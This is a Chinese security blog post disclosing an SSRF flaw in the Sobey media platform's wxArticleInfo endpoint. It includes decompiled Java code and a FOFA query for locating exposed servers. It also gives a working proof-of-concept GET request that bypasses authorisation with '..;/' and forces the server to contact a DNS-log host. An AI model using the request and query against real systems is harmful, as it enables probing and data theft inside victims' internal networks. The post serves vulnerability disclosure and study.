---
title: "索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞"
source: https://mrxn.net/jswz/sobey-WXArticleInt-wxArticleInfo-SSRF.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintwxarticleinfo-ssrf漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/29 11:30
- 631浏览
- [0评论](#comment)
- 25分钟阅读

深入探索

授权

代理服务器

服务器

---

# 漏洞简介

索贝融媒体是一套面向新闻传媒行业的内容生产与发布平台，主要用于稿件采编、融媒协同管理以及多渠道分发。该系统的 **/sobey-mchEditor/mch/WXArticleInt/wxArticleInfo** 接口在处理外部请求参数时缺乏严格的地址校验与访问控制，导致存在服务器端请求伪造（[SSRF](https://mrxn.net/tag/SSRF)）漏洞。攻击者可通过该漏洞诱导服务器发起任意 HTTP/HTTPS 请求，从而探测内网服务结构、访问受限接口，甚至在特定条件下实现对内网应用的数据窃取或进一步利用。

漏洞修复方案

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
>
> 计算机服务器

# 漏洞分析

根据漏洞信息看下`mch/WXArticleInt/wxArticleInfo`的实现逻辑

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞](images/img-001-4f01b953460c.webp)](https://image.mrxn.net/ab262e5d4577472d9b7afa9886740bed.webp)

直接进入看它的实现逻辑如下

漏洞修复方案

深入探索

SQL注入检测工具

编码转换工具

服务器安全服务

```
@RequestMapping(
    value = {"/wxArticleInfo"},
    method = {RequestMethod.GET}
)
public Response wxArticleInfo(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("wxurl") String wxurl) {
    Response response;
    try {
        Map<String, String> wxDoc = parseWXDoc(wxurl);
        if (wxDoc != null) {
            response = Response.success(wxDoc);
        } else {
            response = Response.failed("解析公众号文章失败");
        }
    } catch (Exception e) {
        e.printStackTrace();
        response = Response.failed("解析公众号文章失败");
    }

    return response;
}
```

参数**wxurl**被带入`parseWXDoc`方法，跟进查看其实现逻辑

```
private static Map<String, String> parseWXDoc(String requestUrl) {
    try {
        logger.info("开始请求微信公众号文章的url:" + requestUrl);
        String proxyIpPort = SystemConfigUtil.getSolarSystemByCache("proxyIpPort", "");
        String proxyType = SystemConfigUtil.getSolarSystemByCache("proxyType", "HTTP");
        String reverseProxyPrefix = SystemConfigUtil.getReverseProxyPrefix();
        Proxy proxy = null;
        if (StringUtils.isNotEmpty(proxyIpPort)) {
            String[] split = proxyIpPort.split(":");
            if ("SOCKS".equalsIgnoreCase(proxyType)) {
                proxy = new Proxy(Type.SOCKS, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
            } else {
                proxy = new Proxy(Type.HTTP, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
            }
        } else if (!StringUtils.isEmpty(reverseProxyPrefix)) {
            requestUrl = StringUtil.dealReverseProxyUrl(requestUrl, reverseProxyPrefix);
        }

        Connection connect = Jsoup.connect(requestUrl);
        if (proxy != null) {
            connect.proxy(proxy);
        }
```

requestUrl被直接使用Jsoup.connect进行访问，整个过程中对**wxurl无任何过滤或校验，因此造成[SSRF漏洞](https://mrxn.net/tag/SSRF)。**

# 漏洞复现

> 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分
>
> 漏洞修复方案

```
GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=&token=&wxurl=http://xxe.dnslog.pt/xxe_test HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞](images/img-002-863c0b4235ad.webp)](https://image.mrxn.net/5a791cd0ada445a5a6b7b4682c81815c.webp)

成功在DNSLOG平台收到DNS和HTTP请求

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#SSRF](https://mrxn.net/tag/SSRF)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
